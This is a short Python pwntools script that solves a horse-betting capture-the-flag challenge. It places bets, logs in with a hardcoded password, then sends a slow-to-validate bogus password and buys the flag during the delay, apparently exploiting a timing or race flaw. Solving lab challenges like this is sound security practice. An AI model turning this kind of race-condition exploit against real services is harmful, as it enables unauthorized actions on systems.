from pwn import *
import sys
import time

p = remote("chal.imaginaryctf.org", 42016)

""" Select option opt """
def menu(opt):
	global p
	p.recvuntil(">>>")
	p.sendline(str(opt))

""" place a bet for the horse (including menu handling) """
def placebet(horse, value):
	menu(1)
	p.sendline(horse)
	p.sendline(str(value))

# Bet on horses
placebet("LoosingHorse", 1000)
for i in range(10):
	placebet("WinningHorse"+str(i), 0)

# Lets login
menu(2)
p.sendline("ju5tnEvEEvErl05E")
# Declare winner
menu(1)
w = p.recvuntil("===").decode()
if "LoosingHorse" in w:
	print("Sorry, we had bad luck. Just rerun the program")
	sys.exit(1)

# We have a balance of 1000 now, because our LoosingHorse lost
menu(4) # logout
# Check this password.
# It takes a few seconds to validate and failes in the end
# (Note the trailing 'X')
p.sendline("ju5tn" + ("EvE" * 30) * 1 + "rl05X")
# We should wait here for the message indicating that the check failed, but ..
# .. we are lazy and just wait some time
time.sleep(10)
# Buy the flag
menu(3)
print(p.recvrepeat(timeout=2))
